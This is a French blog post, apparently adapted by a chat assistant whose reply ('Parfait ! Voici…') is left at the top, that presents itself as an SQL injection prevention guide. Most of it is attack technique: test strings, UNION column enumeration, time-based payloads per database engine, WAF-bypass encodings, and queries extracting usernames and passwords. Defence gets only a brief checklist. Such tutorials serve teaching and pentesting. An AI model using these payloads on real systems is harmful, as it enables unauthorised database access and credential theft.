---
title: "Les injections SQL en 2025 - Guide complet de prévention"
slug: sqli-2025-guide
authors:
  - name: DoctorCode
    title: Expert en Sécurité Web
    url: https://votresite.com
    
tags: [sécurité, webdev, bases de données, owasp]
date: 2025-05-13
description: "Tout ce que vous devez savoir sur les attaques par injection SQL et comment protéger vos applications en 2025"

---


Parfait ! Voici une version **blog adaptée** de ton article sur les failles SQLi, avec un **ton fluide, pédagogique et professionnel**, idéale pour publication sur un blog tech ou cybersécurité. Je conserve le style Markdown pour faciliter la mise en ligne sur des plateformes comme Medium, Dev.to ou un blog statique (Jekyll, Hugo, etc.).

---

````markdown
# 💣 Comprendre les Failles SQLi : Le Guide Complet pour Débutants

La sécurité web est un pilier essentiel du développement moderne. Pourtant, une vulnérabilité vieille comme le web continue de faire des ravages : **l’injection SQL (SQLi)**. 

Dans cet article, je vous propose une plongée claire et structurée dans le monde des failles SQLi : de la découverte de colonnes avec `UNION`, aux techniques de contournement de WAF, en passant par l'exfiltration de données. Un véritable couteau suisse pour mieux comprendre cette menace — et apprendre à s’en protéger.

---

## 🧠 C’est quoi une injection SQL ?

L’injection SQL consiste à insérer du code SQL malveillant dans une requête prévue pour interagir avec une base de données. Elle survient généralement via des champs non filtrés comme un formulaire de connexion ou une URL.

**Exemple simple :**
```sql
Input : ' OR 1=1 --
Requête : SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''
````

Résultat ? Tous les utilisateurs sont retournés, contournant toute authentification.

---

## 📌 1. Types d’injection SQL

Voici les principaux types d'injection à connaître :

| Type                   | Description                                               | Exemple                             |
| ---------------------- | --------------------------------------------------------- | ----------------------------------- |
| **Inband (classique)** | L'attaquant voit directement le résultat.                 | `' OR '1'='1`                       |
| **Error-based**        | Exploite les messages d'erreur SQL.                       | `' AND 1=CONVERT(int, @@version)--` |
| **Blind (booléen)**    | Injection sans message visible, mais résultat observable. | `' AND 1=1 --`                      |
| **Time-based**         | Injection confirmée via un délai volontaire.              | `' OR SLEEP(5)--`                   |
| **Out-of-band**        | Utilise un canal externe (rare).                          | Exfiltration DNS                    |

---

## 🔍 2. Tester une injection basique

Voici des chaînes simples pour tester une potentielle vulnérabilité :

* `' OR 1=1--`
* `" OR ""="`
* `admin'--`
* `1' ORDER BY 1--`

Si l'application renvoie une erreur ou affiche un comportement étrange : bingo.

---

## 🧮 3. Combien de colonnes ? (avec UNION)

Le test via `ORDER BY` permet d’estimer le nombre de colonnes :

```sql
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3-- (jusqu'à erreur)
```

Ensuite, on teste l’injection `UNION SELECT` :

```sql
' UNION SELECT 1--  
' UNION SELECT 1,2--  
' UNION SELECT 1,2,3--  
```

Le bon nombre de colonnes = pas d'erreur SQL.

---

## 🔐 4. Commentaires SQL utiles

Selon le moteur SQL, on peut commenter pour neutraliser le reste de la requête :

* `--` ou `#` (MySQL, SQLite)
* `/* */` (toutes bases)
* `--+` pour certaines protections

---

## 🗃️ 5. Requêtes selon le SGBD

| Base de données | Exemples utiles |
|------------------|------------------|
| **MySQL**        | - `SELECT @@version`  <br />- `SELECT * FROM INFORMATION_SCHEMA.TABLES` |
| **PostgreSQL**   | - `SELECT version()` <br />- `SELECT * FROM pg_catalog.pg_tables` |
| **Oracle**       | - `SELECT * FROM v$version` <br />- `SELECT * FROM all_tables` |
| **SQL Server**   | - `SELECT @@version` <br />- `WAITFOR DELAY '0:0:5'` |


---

## 🛌 6. Time-based SQLi

Quand aucune erreur ou retour n’est visible, on utilise des délais pour observer une réaction.

* **MySQL** : `' OR IF(1=1, SLEEP(5), 0)--`
* **PostgreSQL** : `' OR 1=1; SELECT pg_sleep(5)--`
* **MSSQL** : `' WAITFOR DELAY '0:0:5'--`

---

## 🧬 7. Contourner les WAFs (Web Application Firewalls)

Pour éviter les blocages automatiques, voici quelques techniques :

| Technique       | Exemple                           |
| --------------- | --------------------------------- |
| Encodage URL    | `%27 OR 1=1--`                    |
| Double encodage | `%2527` pour `'`                  |
| Casse tordue    | `SeLeCt`, `oR`, `UnIoN`           |
| Commentaires    | `UN/**/ION/**/SELECT`             |
| Concaténation   | `CONCAT(username, ':', password)` |

---

## 🧪 8. Exfiltrer les données

Lister les tables :

```sql
' UNION SELECT null, table_name FROM information_schema.tables--
```

Lister les colonnes d'une table :

```sql
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
```

Récupérer les données :

```sql
' UNION SELECT username, password FROM users--
```

---

## 🛡️ 9. Comment se protéger ?

* ✅ Utiliser des **requêtes préparées** (ex : PDO, ORM).
* ✅ Filtrer et valider **chaque entrée utilisateur**.
* ✅ Ne jamais **concaténer des chaînes SQL**.
* ✅ Garder les logiciels **à jour**.
* ✅ Utiliser un **WAF**, mais pas comme unique barrière.

---

## 🎯 Conclusion

Les injections SQL sont simples à exploiter, mais aussi simples à éviter si les bonnes pratiques sont respectées. Que vous soyez développeur, pentester, ou simplement curieux, maîtriser le SQLi est une étape essentielle pour comprendre les rouages de la cybersécurité web.

---

> ⚠️ **Disclaimer** : Ce guide est fourni à des fins éducatives uniquement. Tester sans autorisation est **illégal** et contraire à l’éthique.

